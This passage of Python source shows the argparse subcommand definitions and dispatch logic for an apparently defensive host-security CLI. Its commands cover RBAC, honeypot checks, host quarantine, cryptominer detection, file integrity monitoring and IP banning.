    # 8. Enterprise Maintenance Defense & Authorization
    p_maint = subparsers.add_parser("maintenance", help="Manage Enterprise Maintenance Mode & Access Whitelists")
    p_maint.add_argument("action", nargs="?", default="status", choices=["on", "off", "status", "allow", "deny"], help="Maintenance action")
    p_maint.add_argument("--reason", type=str, default=None, help="Reason for maintenance window")
    p_maint.add_argument("--allowed", type=str, default=None, help="Comma-separated allowed usernames")
    p_maint.add_argument("--user", type=str, default=None, help="Target username for allow/deny")

    # 9. Role-Based Access Control (RBAC)
    p_auth = subparsers.add_parser("auth", help="Manage Role-Based Access Control (RBAC) permissions")
    p_auth.add_argument("action", nargs="?", default="list", choices=["list", "set-role", "check"], help="Auth action")
    p_auth.add_argument("--user", type=str, default=None, help="Target username")
    p_auth.add_argument("--role", type=str, default=None, choices=["ADMIN", "OPERATOR", "DEVOPS", "AUDITOR", "RESTRICTED"], help="Assigned role")

    # 10. Honeypot Traps & Decoys
    p_hp = subparsers.add_parser("honeypot", help="Manage Honeypot Decoy Traps & Port 22 SSH Protection")
    p_hp.add_argument("action", nargs="?", default="status", choices=["status", "test-probe"], help="Honeypot action")
    p_hp.add_argument("--port", type=int, default=22, help="Decoy port to test")

    # 11. Granular Permissions & User Experience Comparison
    p_perm = subparsers.add_parser("perm", help="Manage Granular User Permissions (READ, WRITE, EXEC, NET, ADMIN)")
    p_perm.add_argument("action", nargs="?", default="list", choices=["list", "set", "get", "check"], help="Perm action")
    p_perm.add_argument("target_user", nargs="?", default=None, help="Target username (positional)")
    p_perm.add_argument("target_value", nargs="?", default=None, help="Permissions string or Command to check (positional)")
    p_perm.add_argument("--user", type=str, default=None, help="Target username")
    p_perm.add_argument("--perms", type=str, default=None, help="Permission flags e.g. 'rwx', 'read,write,network', 'all'")
    p_perm.add_argument("--cmd", type=str, default=None, help="Command to inspect with 'check'")

    p_cmp = subparsers.add_parser("compare", help="Compare user experience and permission outcomes across roles for any command")
    p_cmp.add_argument("pos_cmd", nargs="?", default=None, help="Command to compare (positional)")
    p_cmp.add_argument("--cmd", type=str, default=None, help="Command to compare (flag)")

    subparsers.add_parser("compare-users", help="Alias for compare")
    subparsers.add_parser("perm-matrix", help="Alias for compare")

    p_msim = subparsers.add_parser("mesh-sim", help="Run automated virtual multi-node / multi-PC network cyber simulation")
    p_msim.add_argument("--speed", type=float, default=0.1, help="Delay between simulation actions in seconds")
    subparsers.add_parser("simulate-mesh", help="Alias for mesh-sim")
    subparsers.add_parser("virtual-nodes", help="Alias for mesh-sim")

    # 12. Emergency Host Network Containment & Quarantine
    p_iso = subparsers.add_parser("isolate-host", help="Emergency Zero-Trust Network Containment (Host Quarantine)")
    p_iso.add_argument("--allow", type=str, default=None, help="Comma-separated whitelisted admin/management IPs")
    p_iso.add_argument("--reason", type=str, default=None, help="Reason for host network containment")

    p_res = subparsers.add_parser("restore-host", help="Restore full host network access and tear down quarantine rules")
    p_res.add_argument("--reason", type=str, default="Admin Remediation Complete", help="Reason for network restoration")

    subparsers.add_parser("containment-status", help="View current host network isolation and quarantine status")

    # 13. Advanced System Resource Abuse & Cryptominer Guard
    p_rg = subparsers.add_parser("resource-guard", help="Inspect, attribute, and remediate CPU/RAM/Disk abuse and cryptominers")
    p_rg.add_argument("action", nargs="?", default="status", choices=["status", "top", "top-consumers", "scan"], help="Resource Guard operation")
    p_rg.add_argument("--limit", type=int, default=5, help="Number of top consuming processes to display")

    # 14. File Integrity Monitoring (FIM) & Anti-Tamper
    p_fim = subparsers.add_parser("fim", help="Manage File Integrity Monitoring (FIM) & Line-by-Line Tamper Diffs")
    p_fim.add_argument("action", nargs="?", default="status", choices=["status", "scan", "check", "rebaseline", "update"], help="FIM action")
    p_fim.add_argument("--file", type=str, default=None, help="Target file path")

    subparsers.add_parser("help", help="Show descriptive help message and examples")

    args = parser.parse_args()

    if getattr(args, "help", False) or args.command == "help":
        print_enhanced_help()
        return

    # Dispatch Command
    if args.command == "start":
        start_daemon_cmd(mode=args.mode, daemon=args.daemon, port=args.port)
    elif args.command == "stop":
        stop_daemon_cmd()
    elif args.command == "restart":
        restart_daemon_cmd(mode=args.mode)
    elif args.command == "audit":
        start_daemon_cmd(mode="dry-run", daemon=False)
    elif args.command == "doctor":
        doctor_cmd()
    elif args.command == "scan":
        scan_cmd(args.payload)
    elif args.command == "test":
        run_tests_cmd(verbose=args.verbose)
    elif args.command == "benchmark":
        run_benchmark_cmd()
    elif args.command in ["benchmark1000", "benchmark-1000"]:
        run_benchmark_1000_cmd()
    elif args.command in ["benchmark10000", "benchmark-10000"]:
        run_benchmark_10000_cmd()
    elif args.command == "simulate":
        simulate_command_cmd(args.payload)
    elif args.command == "simulate-shell":
        simulate_shell_cmd()
    elif args.command in ["monitor", "top"]:
        run_live_monitor()
    elif args.command == "status" or not args.command:
        show_status()
    elif args.command == "logs":
        list_logs_cmd(limit=args.limit, level=args.level, event_type=args.event_type, as_json=args.json)
    elif args.command == "user-audit":
        user_audit_cmd(user=args.user, limit=args.limit)
    elif args.command == "tail":
        tail_logs_cmd(follow=args.follow, lines=args.lines)
    elif args.command == "verify-integrity":
        verify_log_integrity_cmd(args.file)
    elif args.command == "export-report":
        export_report(args.output)
    elif args.command == "cti-check":
        cti_check_cmd(args.target)
    elif args.command == "dga-check":
        dga_check_cmd(args.domain)
    elif args.command == "risk":
        risk_cmd(args.entity, add_points=args.add, reason=args.reason, is_host=args.is_host)
    elif args.command == "memory-scan":
        memory_scan_cmd(pid=args.pid)
    elif args.command == "ban":
        ban_ip_cmd(args.ip, duration=args.duration, criticality=args.criticality, reason=args.reason)
    elif args.command == "unban":
        unban_ip_cmd(args.ip)
    elif args.command == "unban-all":
        unban_all_cmd()
    elif args.command == "list-bans":
        list_all_bans(active_only=args.active_only, limit=args.limit)
    elif args.command == "sessions":
        sessions_cmd(kill_target=args.kill)
    elif args.command in ["add-user", "user-add"]:
        add_user_cmd(username=args.username, role=args.role, perms=args.perms, desc=args.desc)
    elif args.command in ["list-users", "users"]:
        list_users_cmd()
    elif args.command in ["compare", "compare-users", "perm-matrix"]:
        cmd_val = getattr(args, 'cmd', None) or getattr(args, 'pos_cmd', None)
        compare_users_cmd(cmd_str=cmd_val)
    elif args.command in ["mesh-sim", "simulate-mesh", "virtual-nodes"]:
        run_virtual_mesh_cmd(speed=args.speed if hasattr(args, 'speed') else 0.1)
    elif args.command == "maintenance":
        maintenance_cmd(action=args.action, reason=args.reason, allowed=args.allowed, user=args.user)
    elif args.command == "auth":
        auth_cmd(action=args.action, user=args.user, role=args.role)
    elif args.command == "honeypot":
        honeypot_cmd(action=args.action, port=args.port)
    elif args.command in ["perm", "permissions"]:
        perm_cmd(action=args.action, user=args.user, perms=args.perms, cmd_str=args.cmd,
                 target_user=getattr(args, 'target_user', None), target_value=getattr(args, 'target_value', None))
    elif args.command == "isolate-host":
        isolate_host_cmd(allowed=args.allow, reason=args.reason)
    elif args.command == "restore-host":
        restore_host_cmd(reason=args.reason)
    elif args.command == "containment-status":
        containment_status_cmd()
    elif args.command in ["resource-guard", "resource", "resources"]:
        resource_guard_cmd(action=args.action, limit=args.limit)
    elif args.command in ["fim", "file-integrity"]:
        fim_cmd(action=args.action, file_path=args.file)
    elif args.command == "generate-dataset":
        generate_dataset_cmd(samples=args.samples, output=args.output)
    elif args.command == "train-models":
        train_models_cmd(dataset=args.dataset, batch_size=args.batch_size)
    else:
        print_enhanced_help()

if __name__ == "__main__":
    main()
